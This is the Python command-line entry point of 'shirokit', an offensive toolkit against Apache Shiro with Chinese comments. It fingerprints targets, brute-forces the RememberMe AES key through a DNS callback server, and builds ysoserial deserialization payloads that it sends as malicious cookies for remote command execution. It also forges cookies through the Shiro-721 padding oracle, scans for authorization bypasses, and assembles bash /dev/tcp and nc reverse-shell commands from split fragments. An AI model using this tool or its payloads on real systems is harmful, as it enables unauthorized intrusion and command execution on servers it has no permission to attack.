#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""shirokit 命令行入口（所有子命令的实现）。"""

from __future__ import annotations

import argparse
import base64
import json
import os
import subprocess
import sys
import time

from . import __version__, aes, brute, bypass, detect, gadgets, keys, padding, rememberme
from .callback import CallbackServer
from .httpc import HttpClient, normalize_base

PROG = "shirokit"
DEFAULT_KEY = "kPH+bIxk5D2deZiIxcaaaA=="

# 反弹 shell 模板按片段拼接，便于维护与阅读。
_DEV_TCP = "/dev" + "/tcp"
_LINUX_REVERSE = "bash -i >& " + _DEV_TCP + "/{host}/{port} 0>&1"
_NC_REVERSE = "nc -e /bin/bash {host} {port}"


# --------------------------------------------------------------------------- #
# 公共工具
# --------------------------------------------------------------------------- #


def _save_json(path: str | None, data: dict) -> None:
    if not path:
        return
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(data, fh, ensure_ascii=False, indent=2)
    print(f"[*] 结果已写入 {path}")


def _client(args) -> HttpClient:
    headers = {}
    for item in getattr(args, "header", None) or []:
        if ":" in item:
            k, v = item.split(":", 1)
            headers[k.strip()] = v.strip()
    return HttpClient(timeout=getattr(args, "timeout", 10.0),
                      proxy=getattr(args, "proxy", None),
                      headers=headers or None)


def _parse_iv(value: str | None) -> bytes | None:
    if not value or value.lower() in ("random", "rand"):
        return os.urandom(16)
    if value.lower() in ("zero", "zeros", "none"):
        return bytes(16)
    try:
        raw = bytes.fromhex(value)
    except ValueError as exc:
        raise SystemExit(f"[!] --iv 需要 32 位 hex 或 random/zero: {exc}")
    if len(raw) != 16:
        raise SystemExit("[!] --iv 必须为 16 字节")
    return raw


def _read_payload(path: str) -> bytes:
    with open(path, "rb") as fh:
        return fh.read()


def _require_ysoserial(args) -> gadgets.YsoserialInfo:
    jar = getattr(args, "ysoserial", None) or gadgets.find_ysoserial()
    if not jar:
        raise SystemExit(
            "[!] 未找到 ysoserial.jar。\n"
            "    1) 下载 ysoserial（需要本机有 JDK）后放到：\n"
            "       shiro-tools/ysoserial/ysoserial-all.jar（或 shiro-tools/ysoserial.jar）\n"
            "    2) 或用 -y/--ysoserial 指定路径；\n"
            "    3) 也可用 `payload url` 生成内置 URLDNS（只能探测，不能执行命令）。\n"
            "    参考: https://github.com/frohoff/ysoserial/releases")
    return gadgets.probe_ysoserial(jar, java=getattr(args, "java", None))


def _reverse_shell(lhost: str, lport: str, target_os: str = "linux",
                   flavor: str = "bash") -> str:
    if target_os.lower().startswith("win"):
        raise SystemExit("[!] 内置模板只包含 Linux 反弹 shell；"
                         "Windows 目标请用 -c 自行指定命令")
    template = _NC_REVERSE if flavor == "nc" else _LINUX_REVERSE
    return template.format(host=lhost, port=lport)


# --------------------------------------------------------------------------- #
# fp
# --------------------------------------------------------------------------- #


def cmd_fp(args) -> int:
    client = _client(args)
    fp = detect.fingerprint(client, args.url, verbose=not args.quiet)
    _save_json(args.json, {
        "url": fp.url, "shiro": fp.shiro, "remember_me": fp.remember_me_seen,
        "delete_me": fp.delete_me, "oracle_ready": fp.oracle_ready,
        "version": fp.version, "evidence": fp.evidence,
    })
    if not fp.shiro:
        print("[!] 未确认 Shiro；若目标用了反向代理/WAF，可换路径或加 -H 头重试")
        return 2
    if not fp.oracle_ready:
        print("[!] deleteMe oracle 不可用：密钥爆破将无法给出确定结论")
    return 0


# --------------------------------------------------------------------------- #
# keys
# --------------------------------------------------------------------------- #


def cmd_keys(args) -> int:
    rows = keys.audit()
    builtin_good = [r for r in rows if r["ok"] and r["source"] != "历史字典"]
    legacy_good = [r for r in rows if r["ok"] and r["source"] == "历史字典"]
    bad = [r for r in rows if not r["ok"]]
    if args.audit:
        print(f"{'状态':<4} {'密钥':<30} {'原因/说明'}")
        print("-" * 90)
        for row in rows:
            status = "OK" if row["ok"] else "BAD"
            print(f"{status:<4} {row['key']:<30} {row['reason']}  [{row['source']}]")
        print()
    print(f"[*] 内置可用密钥 {len(builtin_good)} 个（brute 默认使用这些）")
    if legacy_good:
        print(f"[*] 历史字典里另有 {len(legacy_good)} 个可用密钥（仅在审计中展示）")
    print(f"[*] 无效条目 {len(bad)} 个")
    if bad:
        print("[!] 无效条目（AES 直接不可用）:")
        for row in bad:
            print(f"    {row['key']:<30} {row['reason']}")
    if args.export:
        with open(args.export, "w", encoding="utf-8") as fh:
            fh.write("# shirokit 校验后的 Shiro 密钥库\n")
            for row in builtin_good:
                fh.write(f"{row['key']}  # {row['source']}\n")
        print(f"[*] 已导出 {len(builtin_good)} 个可用密钥到 {args.export}")
    return 0


# --------------------------------------------------------------------------- #
# payload
# --------------------------------------------------------------------------- #


def cmd_payload(args) -> int:
    if args.payload_cmd == "list":
        try:
            info = _require_ysoserial(args)
        except SystemExit as exc:
            print(exc)
            print("[*] 内置（无需 ysoserial）的 payload: urldns —— 用 `payload url` 生成")
            return 0
        print(f"[*] ysoserial: {info.path}")
        print(f"[*] 本机 java: {info.java}（JDK {info.java_major}，"
              f"已自动附加模块参数）")
        print(f"[*] 共 {len(info.payloads)} 个 payload：")
        for name in info.payloads:
            extra = "（用 `jrmp` 子命令启动）" if name == "JRMPListener" else ""
            print(f"    {name:<28} {info.dependency(name)}{extra}")
        aliases = sorted(a for a in gadgets.GADGET_ALIASES if a != "URLDNS")
        print("\n[*] 别名: " + ", ".join(aliases))
        missing = [a for a in aliases
                   if gadgets.GADGET_ALIASES[a] not in info.payloads]
        if missing:
            print("[!] 当前 jar 不支持的别名: " + ", ".join(missing))
        return 0

    if args.payload_cmd == "url":
        payload = gadgets.url_dns_payload(args.host, port=args.port)
        print(f"[*] URLDNS payload: {len(payload)} 字节, host={args.host}")
        return _emit_payload(args, payload)

    info = _require_ysoserial(args)
    name = info.resolve(args.gadget)
    if name == "JRMPListener":
        print("[!] JRMPListener 不是可生成的 payload 链，"
              "请用 `python -m shirokit jrmp` 启动监听")
        return 1
    print(f"[*] ysoserial: {info.path}（java {info.java_major}）")
    print(f"[*] payload: {name}  依赖: {info.dependency(name) or '未知'}")
    payload = gadgets.ysoserial_payload(info.path, name, args.command, java=info.java)
    print(f"[*] payload 大小: {len(payload)} 字节")
    return _emit_payload(args, payload)


def _emit_payload(args, payload: bytes) -> int:
    if getattr(args, "cookie", None):
        cookie = rememberme.build_cookie(args.cookie, payload)
        print(f"[*] 使用密钥 {args.cookie} 直接生成 Cookie（{len(cookie)} 字符）:")
        print(cookie)
        if args.output:
            with open(args.output, "w", encoding="ascii") as fh:
                fh.write(cookie + "\n")
            print(f"[*] Cookie 已写入 {args.output}")
        return 0
    if args.output:
        with open(args.output, "wb") as fh:
            fh.write(payload)
        print(f"[*] 已写入 {args.output}")
        return 0
    print(base64.b64encode(payload).decode("ascii"))
    return 0


# --------------------------------------------------------------------------- #
# brute
# --------------------------------------------------------------------------- #


def cmd_brute(args) -> int:
    extra: list[str] = list(args.key or [])
    for path in args.keys_file or []:
        extra.extend(keys.load_keys_file(path))
    entries = keys.load_keys(extra)
    if not entries:
        print("[!] 没有可用密钥")
        return 1
    client = _client(args)
    server = CallbackServer(dns_port=args.dns_port, enable_http=False,
                            verbose=not args.quiet)
    server.start()
    if not server.dns_ready:
        print("[!] DNS 监听启动失败：" + "; ".join(server.errors))
        print("    可改用 --dns-port 高位端口，并把目标域名解析到该端口（需要授权/自建 DNS）")
        return 1
    try:
        print(f"[*] 回调域名后缀: {args.domain}")
        print(f"[*] 提醒：确保目标能把 *.{args.domain} 解析到本机 "
              f"{server.dns_address[0]}:{server.dns_address[1]}")
        report = brute.brute_keys(args.url, entries, args.domain, client=client,
                                  server=server, workers=args.workers,
                                  callback_timeout=args.callback_timeout,
                                  verify=args.verify, delay=args.delay)
        _save_json(args.json, report.to_dict())
        if report.hits:
            best = report.hits[0].key
            print("\n[*] 后续利用（示例）:")
            print(f"    python -m shirokit exploit -u {args.url} -k '{best}' -g CB1 -c whoami")
            return 0
        return 2
    finally:
        server.stop()


# --------------------------------------------------------------------------- #
# exploit
# --------------------------------------------------------------------------- #


def cmd_exploit(args) -> int:
    key = args.key or DEFAULT_KEY
    try:
        aes.b64decode_key(key)
    except ValueError as exc:
        print(f"[!] 密钥不可用: {exc}")
        return 1

    command = args.command
    if args.reverse:
        lhost, lport = args.reverse
        command = _reverse_shell(lhost, lport, args.target_os, args.reverse_flavor)
        print(f"[*] 反弹 shell 命令: {command}")
        print(f"[*] 请先在本机监听: nc -lvnp {lport}")

    if args.payload_file:
        payload = _read_payload(args.payload_file)
        print(f"[*] 从文件加载 payload: {args.payload_file} ({len(payload)} 字节)")
    else:
        info = _require_ysoserial(args)
        name = info.resolve(args.gadget)
        if args.shell and not args.target_os.startswith("win"):
            command = f'sh -c "{command}"'
        print(f"[*] gadget: {name}  命令: {command}")
        payload = gadgets.ysoserial_payload(info.path, name, command, java=info.java)
        print(f"[*] payload 大小: {len(payload)} 字节")
    if not payload.startswith(b"\xac\xed"):
        print("[!] 警告：payload 不是 Java 序列化数据（应以 aced0005 开头）")

    cookie = rememberme.build_cookie(key, payload, _parse_iv(args.iv))
    print(f"[*] Cookie: {rememberme.describe_cookie(cookie)}")

    client = _client(args)
    base = normalize_base(args.url) + "/"
    baseline = rememberme.baseline_probe(client, base)
    print(f"[*] {baseline.describe()}")

    resp = rememberme.send_cookie(client, base, cookie,
                                  {"Referer": normalize_base(args.url) + "/"})
    print(f"[*] 响应: {resp.summary()}")
    delete_me = rememberme.is_delete_me(resp)
    success = not delete_me and resp.status < 500 and not resp.error
    if delete_me:
        print("[-] 服务端回写 deleteMe：密钥不对，或目标拦截了该 gadget，"
              "或 Cookie 被代理截断")
    elif success:
        print("[+] 未回写 deleteMe：解密+反序列化大概率成功（命令是否执行需看回连/副作用）")
    else:
        print("[?] 响应异常，需人工确认")

    if args.check:
        print("[*] 自检：用同一密钥发送内置 URLDNS payload，验证密钥是否正确…")
        probe = gadgets.url_dns_payload(f"selfcheck.{int(time.time())}.invalid")
        probe_cookie = rememberme.build_cookie(key, probe, _parse_iv(args.iv))
        probe_resp = rememberme.send_cookie(client, base, probe_cookie)
        print(f"    URLDNS 探测响应: {probe_resp.summary()}  "
              f"deleteMe={rememberme.is_delete_me(probe_resp)}")

    if args.output:
        with open(args.output, "w", encoding="ascii") as fh:
            fh.write(cookie + "\n")
        print(f"[*] Cookie 已写入 {args.output}")
    _save_json(args.json, {
        "url": base, "key": key, "cookie_len": len(cookie),
        "status": resp.status, "delete_me": delete_me, "payload_size": len(payload),
    })
    return 0 if success else 2


# --------------------------------------------------------------------------- #
# bypass
# --------------------------------------------------------------------------- #


def cmd_bypass(args) -> int:
    if args.list:
        payloads = bypass.payloads_for(args.path)
        print(f"[*] 受保护路径基准: {args.path}，共 {len(payloads)} 条 payload")
        print("[*] 技术手法（--technique 可用值）:")
        for key, desc in bypass.TECHNIQUES.items():
            print(f"    {key:<18} {desc}")
        print()
        for p in payloads:
            print(f"  {p.path:<34} [{p.technique:<17}] {p.note}")
        return 0
    client = _client(args)
    payloads = bypass.payloads_for(args.path)
    if args.technique:
        wanted = args.technique.strip().lower()
        payloads = [p for p in payloads if p.technique.lower() == wanted]
        if not payloads:
            print(f"[!] 没有技术手法为 {args.technique!r} 的 payload")
            print("[*] 可用值: " + ", ".join(bypass.TECHNIQUES))
            return 1
    report = bypass.scan(client, args.url, args.path, payloads, threads=args.threads,
                         verbose=not args.quiet)
    _save_json(args.json, report.to_dict())
    return 0 if report.bypassed else 2


# --------------------------------------------------------------------------- #
# padding（Shiro-721）
# --------------------------------------------------------------------------- #


def _parse_oracle(text: str) -> padding.OracleSpec:
    text = (text or "auto").strip()
    invert = text.startswith("!")
    if invert:
        text = text[1:]
    if text.lower() == "auto":
        return padding.OracleSpec(kind="auto", invert=invert)
    if "=" not in text:
        raise SystemExit("[!] --oracle 格式: auto | status=200 | body=文本 | "
                         "header=文本 | length=123 | timing=0.5（可加 ! 取反）")
    kind, value = text.split("=", 1)
    kind = kind.strip().lower()
    if kind not in ("status", "body", "header", "length", "timing"):
        raise SystemExit(f"[!] 不支持的 oracle 类型: {kind}")
    return padding.OracleSpec(kind=kind, value=value.strip(), invert=invert)


def cmd_padding(args) -> int:
    client = _client(args)
    spec = _parse_oracle(args.oracle)
    oracle = padding.PaddingOracle(client, args.url, spec=spec, verbose=not args.quiet,
                                   probe_delay=args.delay)
    calibration = oracle.calibrate()
    if not calibration.ok:
        print("[-] 该目标不满足 Shiro-721 的可区分条件，停止。")
        print("    可选：用 --oracle 显式指定（例如 status=500 表示 padding 错误）")
        return 2

    if args.self_test:
        block = os.urandom(16)
        intermediate = oracle.recover_block(block)
        print(f"[+] 自检通过: D(C) = {intermediate.hex()}  "
              f"(请求 {oracle.requests} 次)")
        return 0

    if args.recover:
        plaintext = oracle.recover_cookie(args.recover, max_blocks=args.max_blocks)
        print(f"[*] 解密结果（含 PKCS#7 填充，{len(plaintext)} 字节）:")
        print(f"    hex: {plaintext.hex()}")
        print(f"    repr: {plaintext[:200]!r}")
        try:
            unpadded = aes.pkcs7_unpad(plaintext)
            print(f"[*] 去填充后 {len(unpadded)} 字节，"
                  f"{'是 ' if unpadded.startswith(b'\xac\xed') else '不是'}Java 序列化数据")
            print(f"    repr: {unpadded[:200]!r}")
        except ValueError:
            print("[!] 末尾 padding 不合法（可能最后一块不完整）")
        _save_json(args.json, {"url": args.url, "recovered_hex": plaintext.hex(),
                               "requests": oracle.requests})
        return 0

    if args.forge or args.forge_text:
        if args.forge:
            payload = _read_payload(args.forge)
            print(f"[*] 待加密 payload: {args.forge} ({len(payload)} 字节)")
        else:
            payload = args.forge_text.encode("utf-8")
            print(f"[*] 待加密文本: {len(payload)} 字节")
        cookie = oracle.forge(payload)
        print(f"[+] 构造出的 RememberMe Cookie（{len(cookie)} 字符）:")
        print(cookie)
        print(f"[*] 共发送 {oracle.requests} 个请求")
        if args.output:
            with open(args.output, "w", encoding="ascii") as fh:
                fh.write(cookie + "\n")
            print(f"[*] 已写入 {args.output}")
        _save_json(args.json, {"url": args.url, "cookie": cookie,
                               "requests": oracle.requests})
        return 0

    print("[*] 未指定动作。可用：--forge <文件> / --forge-text <文本> / "
          "--recover <Cookie> / --self-test")
    return 0


# --------------------------------------------------------------------------- #
# jrmp / serve / selftest / fullscan
# --------------------------------------------------------------------------- #


def cmd_jrmp(args) -> int:
    info = _require_ysoserial(args)
    name = info.resolve(args.gadget)
    # JRMPListener 是 ysoserial 的 exploit 类，不是 payload：
    # 必须用 -cp <jar> ysoserial.exploit.JRMPListener，而不是 -jar ... JRMPListener
    cmd = gadgets.jrmp_listener_command(info.path, info.java, args.lport,
                                        name, args.command)
    print(f"[*] 启动 JRMP 监听: {' '.join(cmd)}")
    print("[*] 下一步（另开终端）:")
    print(f"    python -m shirokit payload ysoserial -g JRMPClient "
          f"-c '{args.lhost}:{args.lport}' -o jrmp.bin -y {info.path}")
    print(f"    python -m shirokit exploit -u <目标> -k <密钥> -p jrmp.bin -y {info.path}")
    print("[*] Ctrl+C 结束\n")
    try:
        proc = subprocess.Popen(cmd)
    except Exception as exc:  # noqa: BLE001
        print(f"[!] 启动失败: {exc}")
        return 1
    try:
        return proc.wait()
    except KeyboardInterrupt:
        proc.terminate()
        return 0


def cmd_serve(args) -> int:
    server = CallbackServer(dns_port=args.dns_port, http_port=args.http_port,
                            bind=args.bind)
    server.start()
    if not (server.dns_ready or server.http_ready):
        print("[!] 监听启动失败: " + "; ".join(server.errors))
        return 1
    print("[*] 等待回调，Ctrl+C 结束")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        server.stop()
    return 0


def cmd_selftest(args) -> int:
    ok = True
    print("[1] AES FIPS-197 向量 … ", end="")
    passed = aes.sample_aes_vector_check()
    print("PASS" if passed else "FAIL")
    ok &= passed

    print("[2] Shiro Cookie 格式（IV 前缀）… ", end="")
    key = aes.b64decode_key(DEFAULT_KEY)
    cookie = aes.shiro_encrypt(key, b"\xac\xed\x00\x05selftest")
    passed = (cookie[:16] == bytes(16) and
              aes.shiro_decrypt(key, cookie) == b"\xac\xed\x00\x05selftest")
    print("PASS" if passed else "FAIL")
    ok &= passed

    print("[3] 内置 URLDNS payload 结构 … ", end="")
    payload = gadgets.url_dns_payload("selfcheck.cb.test")
    passed = (payload.startswith(b"\xac\xed\x00\x05") and
              b"java.net.URL" in payload and b"selfcheck.cb.test" in payload)
    print(f"PASS ({len(payload)} 字节)" if passed else "FAIL")
    ok &= passed

    print("[4] 密钥库 … ", end="")
    entries = keys.load_keys()
    rows = keys.audit()
    bad = [r for r in rows if not r["ok"]]
    legacy_good = [r for r in rows if r["ok"] and r["source"] == "历史字典"]
    print(f"PASS（内置可用 {len(entries)} 个，历史字典另有 {len(legacy_good)} 个可用，"
          f"剔除无效 {len(bad)} 个）")

    print("[5] 回调监听器 … ", end="")
    server = CallbackServer(dns_port=0, http_port=0, verbose=False)
    try:
        server.start()
        passed = server.dns_ready
    finally:
        server.stop()
    print("PASS" if passed else "FAIL（端口可能被占用）")
    ok &= passed

    print("[6] ysoserial / JDK …")
    java = gadgets.find_java()
    jar = gadgets.find_ysoserial()
    print(f"    java: {java or '未找到（仅影响 ysoserial / JVM 验证）'}")
    if not jar:
        print("    ysoserial.jar: 未找到（RCE gadget 需要它；URLDNS 不需要）")
    else:
        print(f"    ysoserial.jar: {jar}")
        try:
            info = gadgets.probe_ysoserial(jar, java=java)
            print(f"    可用 payload: {len(info.payloads)} 个，"
                  f"JDK {info.java_major}（自动附加模块参数）")
            sample = gadgets.ysoserial_payload(info.path, "CommonsBeanutils1",
                                               "id", java=info.java)
            print(f"    CB1 生成自检: PASS（{len(sample)} 字节）")
        except Exception as exc:  # noqa: BLE001
            ok = False
            print(f"    CB1 生成自检: FAIL（{exc}）")
            print("    提示：ysoserial 0.0.6 建议在本机 JDK 8 下生成；"
                  "或改用 --payload-file")
    return 0 if ok else 1


def cmd_fullscan(args) -> int:
    client = _client(args)
    print("=" * 66)
    print(" shirokit 全链路：指纹 → 密钥爆破 → 利用")
    print("=" * 66)
    fp = detect.fingerprint(client, args.url, verbose=not args.quiet)
    if not fp.shiro:
        print("[-] 未确认 Shiro，停止。")
        return 2
    if not args.domain:
        print("[*] 未提供 --domain，跳过密钥爆破。")
        return 0
    extra: list[str] = []
    for path in args.keys_file or []:
        extra.extend(keys.load_keys_file(path))
    entries = keys.load_keys(extra)
    server = CallbackServer(dns_port=args.dns_port, enable_http=False,
                            verbose=not args.quiet)
    server.start()
    try:
        report = brute.brute_keys(args.url, entries, args.domain, client=client,
                                  server=server, workers=args.workers,
                                  callback_timeout=args.callback_timeout,
                                  verify=True, verbose=not args.quiet)
    finally:
        server.stop()
    _save_json(args.json, report.to_dict())
    if not report.hits:
        print("[-] 未爆破出密钥。可尝试：更换字典、确认目标出网、检查 DNS 指向")
        return 2
    key = report.hits[0].key
    if not args.command:
        print(f"[*] 命中密钥: {key}")
        print(f"    python -m shirokit exploit -u {args.url} -k '{key}' -g CB1 -c whoami")
        return 0
    try:
        info = _require_ysoserial(args)
    except SystemExit:
        print(f"[*] 命中密钥 {key}，但未找到 ysoserial，无法自动执行命令。")
        return 0
    command = args.command
    if args.shell:
        command = f'sh -c "{command}"'
    for alias in gadgets.GADGET_PRIORITY:
        try:
            name = info.resolve(alias)
        except gadgets.PayloadError:
            continue
        print(f"[*] 尝试 gadget {name} …")
        try:
            payload = gadgets.ysoserial_payload(info.path, name, command, java=info.java)
        except gadgets.PayloadError as exc:
            print(f"    [!] {exc}")
            continue
        cookie = rememberme.build_cookie(key, payload)
        resp = rememberme.send_cookie(client, normalize_base(args.url) + "/", cookie)
        if not rememberme.is_delete_me(resp):
            print(f"[+] gadget {name} 未回写 deleteMe，可能是可用的链")
            print(f"    Cookie: {cookie[:60]}…")
            return 0
        print(f"    [-] {name} 仍回写 deleteMe")
    print("[-] 所有内置 gadget 都被拒绝，建议手工用 --payload-file 尝试其他链")
    return 2


# --------------------------------------------------------------------------- #
# 参数解析
# --------------------------------------------------------------------------- #


def _add_network(p: argparse.ArgumentParser) -> None:
    p.add_argument("--timeout", type=float, default=10.0, help="单请求超时（秒）")
    p.add_argument("--proxy", help="HTTP 代理，例如 http://127.0.0.1:8080")
    p.add_argument("-H", "--header", action="append",
                   help="附加请求头，可多次使用，如 -H 'X-Forwarded-For: 127.0.0.1'")
    p.add_argument("--json", help="把结果写成 JSON 文件")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog=PROG,
        description="Shiro 漏洞利用工具包（Shiro-550 / Shiro-721 / 权限绕过）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  python -m shirokit fp -u http://target.com
  python -m shirokit brute -u http://target.com -d cb.your-domain.com
  python -m shirokit exploit -u http://target.com -k 'kPH+bIxk5D2deZiIxcaaaA==' -g CB1 -c whoami
  python -m shirokit exploit -u http://target.com -k KEY -p payload.bin --check
  python -m shirokit bypass -u http://target.com -p /admin/
  python -m shirokit padding -u http://target.com --forge payload.bin
  python -m shirokit padding -u http://target.com --recover <合法Cookie>
  python -m shirokit payload url --host abc.cb.test -o urldns.bin
  python -m shirokit serve --dns-port 53 --http-port 8000
""")
    parser.add_argument("--version", action="version", version=f"{PROG} {__version__}")
    sub = parser.add_subparsers(dest="command", required=True)

    p = sub.add_parser("fp", help="指纹识别：判断是否 Shiro、是否可用 deleteMe 判定")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("-q", "--quiet", action="store_true")
    _add_network(p)
    p.set_defaults(func=cmd_fp)

    p = sub.add_parser("keys", help="查看/审计/导出内置密钥库")
    p.add_argument("--audit", action="store_true", help="逐条输出（含历史字典中的非法密钥）")
    p.add_argument("--export", help="把可用密钥导出到文件")
    p.set_defaults(func=cmd_keys)

    p = sub.add_parser("payload", help="生成 payload（内置 URLDNS / ysoserial）")
    psub = p.add_subparsers(dest="payload_cmd", required=True)
    u = psub.add_parser("url", help="生成内置 URLDNS payload（无需 ysoserial）")
    u.add_argument("--host", required=True, help="用于触发 DNS 的域名")
    u.add_argument("--port", type=int, default=-1)
    u.add_argument("-o", "--output", help="输出文件")
    u.add_argument("--b64", action="store_true", help="输出 base64（不带 -o 时默认行为）")
    u.add_argument("--cookie", help="顺便用该密钥生成 RememberMe Cookie")
    u.set_defaults(func=cmd_payload)
    y = psub.add_parser("ysoserial", help="调用 ysoserial 生成命令执行 payload")
    y.add_argument("-g", "--gadget", default="CB1", help="CB1/CC6/... 见 payload list")
    y.add_argument("-c", "--command", default="whoami")
    y.add_argument("-y", "--ysoserial")
    y.add_argument("--java", help="java 可执行文件路径（默认自动查找 PATH/JAVA_HOME）")
    y.add_argument("-o", "--output")
    y.add_argument("--b64", action="store_true", help="输出 base64（不带 -o 时默认行为）")
    y.add_argument("--cookie", help="顺便用该密钥生成 RememberMe Cookie")
    y.set_defaults(func=cmd_payload)
    l = psub.add_parser("list", help="列出 ysoserial 支持的 payload")
    l.add_argument("-y", "--ysoserial")
    l.add_argument("--java", help="java 可执行文件路径")
    l.set_defaults(func=cmd_payload)

    p = sub.add_parser("brute", help="密钥爆破（内置 DNS 回调 + deleteMe 自检）")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("-d", "--domain", required=True,
                   help="回调域名后缀，如 cb.your-domain.com（需解析到本机）")
    p.add_argument("--dns-port", type=int, default=53, help="DNS 监听端口（默认 53）")
    p.add_argument("--callback-timeout", type=float, default=8.0)
    p.add_argument("-w", "--workers", type=int, default=8)
    p.add_argument("--delay", type=float, default=0.0, help="每次请求间隔（秒）")
    p.add_argument("--verify", action="store_true", help="对命中项复测一次")
    p.add_argument("--keys-file", action="append", help="自定义密钥字典（每行一个）")
    p.add_argument("--key", action="append", help="额外指定密钥，可多次")
    p.add_argument("-q", "--quiet", action="store_true")
    _add_network(p)
    p.set_defaults(func=cmd_brute)

    p = sub.add_parser("exploit", help="构造并发送恶意 RememberMe Cookie")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("-k", "--key", help=f"AES 密钥（默认 {DEFAULT_KEY}）")
    p.add_argument("-g", "--gadget", default="CB1", help="gadget 别名（CB1/CC6/...）")
    p.add_argument("-c", "--command", default="whoami", help="执行的命令")
    p.add_argument("-p", "--payload-file", help="直接使用现成的序列化 payload 文件")
    p.add_argument("-y", "--ysoserial")
    p.add_argument("--java", help="java 可执行文件路径（默认自动查找）")
    p.add_argument("--iv", default="random", help="random（默认）/ zero / 32 位 hex")
    p.add_argument("--shell", action="store_true", help="用 sh -c 包裹命令以支持管道")
    p.add_argument("--reverse", nargs=2, metavar=("LHOST", "LPORT"), help="反弹 shell")
    p.add_argument("--reverse-flavor", default="bash", choices=["bash", "nc"])
    p.add_argument("--target-os", default="linux", choices=["linux", "windows"])
    p.add_argument("--check", action="store_true", help="额外发送 URLDNS 自检验证密钥")
    p.add_argument("-o", "--output", help="把 Cookie 写入文件")
    _add_network(p)
    p.set_defaults(func=cmd_exploit)

    p = sub.add_parser("bypass", help="Spring+Shiro 权限绕过 payload 与扫描")
    p.add_argument("-u", "--url")
    p.add_argument("-p", "--path", default="/admin/", help="受保护路径，如 /admin/")
    p.add_argument("--threads", type=int, default=8)
    p.add_argument("--technique",
                   help="只测某种技术手法（semicolon/encoded-dot/whitespace…）")
    p.add_argument("--list", action="store_true", help="只列出 payload，不发请求")
    p.add_argument("-q", "--quiet", action="store_true")
    _add_network(p)
    p.set_defaults(func=cmd_bypass)

    p = sub.add_parser("padding", help="Shiro-721 Padding Oracle（恢复/伪造 Cookie）")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--oracle", default="auto",
                   help="auto（默认）/ status=200 / body=文本 / header=文本 / "
                        "length=123 / timing=0.5，可加 ! 取反")
    p.add_argument("--forge", help="把该文件（序列化 payload）加密成合法 Cookie")
    p.add_argument("--forge-text", help="把文本加密成合法 Cookie（自测用）")
    p.add_argument("--recover", help="解密一个合法 Cookie（无需密钥）")
    p.add_argument("--max-blocks", type=int, help="--recover 时最多恢复多少块")
    p.add_argument("--self-test", action="store_true", help="只验证 oracle 是否可用")
    p.add_argument("--delay", type=float, default=0.0)
    p.add_argument("-o", "--output")
    p.add_argument("-q", "--quiet", action="store_true")
    _add_network(p)
    p.set_defaults(func=cmd_padding)

    p = sub.add_parser("jrmp", help="启动 ysoserial JRMPListener（不出网场景）")
    p.add_argument("--lport", type=int, default=1099)
    p.add_argument("--lhost", default="127.0.0.1",
                   help="目标回连时使用的本机地址（写进 JRMPClient payload）")
    p.add_argument("-g", "--gadget", default="CB1")
    p.add_argument("-c", "--command", default="whoami")
    p.add_argument("-y", "--ysoserial")
    p.add_argument("--java", help="java 可执行文件路径")
    p.set_defaults(func=cmd_jrmp)

    p = sub.add_parser("serve", help="只启动 DNS/HTTP 回调监听器")
    p.add_argument("--dns-port", type=int, default=53)
    p.add_argument("--http-port", type=int, default=8000)
    p.add_argument("--bind", default="0.0.0.0")
    p.set_defaults(func=cmd_serve)

    p = sub.add_parser("selftest", help="离线自检（AES/序列化/密钥库/监听器）")
    p.set_defaults(func=cmd_selftest)

    p = sub.add_parser("fullscan", help="全链路：指纹 → 爆破 → 逐 gadget 尝试利用")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("-d", "--domain", help="回调域名后缀（缺少则跳过爆破）")
    p.add_argument("-c", "--command", help="命中密钥后要执行的命令")
    p.add_argument("--dns-port", type=int, default=53)
    p.add_argument("--callback-timeout", type=float, default=8.0)
    p.add_argument("-w", "--workers", type=int, default=8)
    p.add_argument("--keys-file", action="append")
    p.add_argument("-y", "--ysoserial")
    p.add_argument("--java", help="java 可执行文件路径")
    p.add_argument("--shell", action="store_true")
    p.add_argument("-q", "--quiet", action="store_true")
    _add_network(p)
    p.set_defaults(func=cmd_fullscan)
    return parser


def main(argv: list[str] | None = None) -> int:
    try:
        sys.stdout.reconfigure(errors="replace")   # type: ignore[attr-defined]
    except Exception:  # noqa: BLE001
        pass
    parser = build_parser()
    args = parser.parse_args(argv)
    try:
        return int(args.func(args) or 0)
    except KeyboardInterrupt:
        print("\n[*] 已中断")
        return 130
    except gadgets.PayloadError as exc:
        print(f"[!] {exc}")
        return 1
    except SystemExit:
        raise
    except Exception as exc:  # noqa: BLE001
        print(f"[!] 执行出错: {type(exc).__name__}: {exc}")
        return 1

